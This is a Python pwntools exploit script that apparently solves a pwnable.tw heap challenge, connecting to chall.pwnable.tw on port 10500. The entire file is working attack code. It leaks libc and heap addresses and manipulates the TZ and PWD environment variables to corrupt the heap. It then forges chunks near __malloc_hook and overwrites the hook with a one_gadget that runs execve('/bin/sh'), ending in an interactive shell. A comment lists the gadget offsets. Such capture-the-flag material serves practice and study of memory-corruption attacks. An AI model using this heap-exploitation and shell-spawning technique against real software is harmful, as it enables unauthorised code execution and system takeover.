from pwn import *

# __printf_chk disables %N$

def create_normal(name: bytes, content: bytes):
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Name of heap:', name)
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Content of heap :', content)

def create_clock(name: bytes):
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Name of heap:', name)
    io.sendlineafter(b'Your choice : ', b'2')

def create_system(name: bytes):
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Name of heap:', name)
    io.sendlineafter(b'Your choice : ', b'3')

def show_heap(idx: int):
    io.sendlineafter(b'Your choice : ', b'2')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.recvuntil(b'Name : ')
    name = io.recvline(keepends = False)
    io.recvuntil(b'Content : ')
    content = io.recvline(keepends = False)
    return name, content

def rename_heap(idx: int, name: bytes):
    io.sendlineafter(b'Your choice : ', b'3')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendafter(b'Name of heap:', name)

def show_normal_content(idx: int):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendlineafter(b'Your choice : ', b'3') 

def change_normal_content(idx: int, content: bytes):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'2\n')
    io.sendafter(b'Content :', content)
    io.sendafter(b'Your choice : ', b'3\n') #return

def show_clock(idx: int):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'1\n')
    io.sendafter(b'Your choice : ', b'3\n') #return

def update_clock(idx: int):
    io.sendafter(b'Your choice : ', b'4\n')
    io.sendafter(b'Index of heap :', str(idx).encode()+b'\n')
    io.sendafter(b'Your choice : ', b'2\n')
    io.sendafter(b'Your choice : ', b'3\n') #return

def play_system_set_env(idx: int, name: bytes, value: bytes):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'1')
    io.sendafter(b'Give me a name for the system heap :', name)
    io.sendafter(b'Give me a value for this name :', value)
    io.sendlineafter(b'Your choice : ', b'5')

def play_system_delete_env(idx: int, name: bytes):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'2')
    io.sendafter(b'What\'s name do you want to unset :', name)
    io.sendlineafter(b'Your choice : ', b'5')

def play_clock_update(idx: int):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'2')
    io.sendlineafter(b'Your choice : ', b'3')

def play_normal_show(idx: int):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'1')
    io.recvuntil(b'Content :')
    data = io.recvuntil(b'*****************************', drop = True)
    io.sendlineafter(b'Your choice : ', b'3')
    return data

def get_realpath(idx: int):
    io.sendlineafter(b'Your choice : ', b'4')
    io.sendlineafter(b'Index of heap :', str(idx).encode())
    io.sendlineafter(b'Your choice : ', b'3')
    io.sendlineafter(b'Your choice : ', b'5')

#io = remote('localhost', 56746)
io = remote('chall.pwnable.tw', 10500)

create_normal(b'A', b'A' * 0x28) # 0
create_system(b'A' * 0x28) # 1
change_normal_content(0, b'A' * 0x28)
name, content = show_heap(0)
libc_base = u64(name.ljust(8, b'\0')) - 0x3c6741;
heap_base = u64(content[0x30:].ljust(8, b'\0')) - 0x30;

log.info('Libc base = ' + hex(libc_base))
log.info('Heap base = ' + hex(heap_base))

play_system_delete_env(1, b'PWD')
play_system_set_env(1, b'PWD', b'.')
create_clock(b'A') # 2
play_system_set_env(1, b'TZ', b'/' * 0x28 + b'/etc/issue')
create_system(b'B') # 3
get_realpath(3)
play_clock_update(2)
create_normal(b'A' * 0x50 + p64(0x604188).rstrip(b'\0') + b'\n', b'A' * 0x18 + p64(0x21) + p64(libc_base + 0x3c4afd)) # 4
rename_heap(4, b'A' * 0x48 + p64(0x21)[:-1] + b'\n')
create_normal(b'A', b'A') # 5
create_normal(b'A' * 0x10 + p64(libc_base + 0x3c4b05)[:-1], b'A') # 6
rename_heap(5, b'\x21')
one_gadget = libc_base + 0xf1247
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
create_normal(b'A' * 0x3 + p64(one_gadget)[:-1] + b'\n', b'A')

io.interactive()
